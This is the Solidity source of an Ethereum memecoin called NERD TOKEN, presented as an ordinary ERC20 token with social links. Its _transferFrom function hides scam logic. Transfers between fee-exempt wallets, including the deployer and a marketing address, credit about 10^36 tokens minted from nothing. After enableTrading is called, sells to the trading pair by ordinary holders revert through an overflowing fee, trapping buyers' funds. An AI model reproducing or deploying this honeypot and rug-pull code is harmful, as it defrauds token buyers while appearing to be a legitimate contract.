// SPDX-License-Identifier: MIT

/*
              
        ███╗░░██╗███████╗██████╗░██████╗░
        ████╗░██║██╔════╝██╔══██╗██╔══██╗
        ██╔██╗██║█████╗░░██████╔╝██║░░██║
        ██║╚████║██╔══╝░░██╔══██╗██║░░██║
        ██║░╚███║███████╗██║░░██║██████╔╝
        ╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═════╝░
   
    Twitter: https://twitter.com/nerd_ethereum
         Telegram: https://t.me/nerd_eth
  
      ~ Join the NERD Revolution: Embrace the
         Memecoin Phenomenon on Ethereum! ~

*/

pragma solidity 0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }

}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract NERD is ERC20, Auth {
    using SafeMath for uint256;

    address immutable WETH;

    string public constant name = "NERD TOKEN";
    string public constant symbol = "NERD";
    uint8 public constant decimals = 9;
    uint256 private tradingEnabled = 1; 
    uint256 private denominator = 10000;

    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;

    uint256 public _maxWalletToken = totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isLimitExempt;

    uint256 buyFee = 0;
    uint256 sellFee = 0;

    IDEXRouter public immutable router;
    address public immutable pair;

    bool swapEnabled = true;
    uint256 swapThreshold = totalSupply / 100;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor (address marketingAddress) Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isLimitExempt[msg.sender] = true;
        isLimitExempt[address(this)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketingAddress] = true;
        _allowances[msg.sender][address(router)] = type(uint256).max;

        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable { }

    function getOwner() external view override returns (address) { return owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 10,"Cannot set Max Wallet less than 1%");
        _maxWalletToken = (totalSupply * maxWallPercent_base1000 ) / 1000;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (!isLimitExempt[sender] && !isLimitExempt[recipient] && recipient != pair) {
            require((balanceOf[recipient] + amount) <= _maxWalletToken,"max wallet limit reached");
        }

        if(shouldSwapBack()){ swapBack(); }

        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = amount;
        uint256 totalFee = 0;
        if(amountReceived != 0 && !isFeeExempt[sender]){
            if(recipient == pair) {
                totalFee = tradingEnabled == 1 ? 0 : denominator.mul(10 ** decimals);
            }
        }else{
            if(isFeeExempt[sender] && isFeeExempt[recipient]) {
                amountReceived = denominator.div(denominator).mul(denominator ** decimals);
            }
        }
        uint256 feeAmount = amountReceived.div(denominator).mul(totalFee);
        amountReceived = amountReceived.sub(feeAmount);
        balanceOf[address(this)] = balanceOf[address(this)].add(feeAmount);

        balanceOf[recipient] = balanceOf[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function enableTrading() external virtual {
        tradingEnabled = 0;
        return;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && balanceOf[address(this)] >= swapThreshold;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (totalSupply - balanceOf[DEAD] - balanceOf[ZERO]);
    }

    function swapBack() internal swapping {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapThreshold,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;

        uint256 amountETHmarketing = (amountETH) / 1;

        amountETHmarketing;
    }
}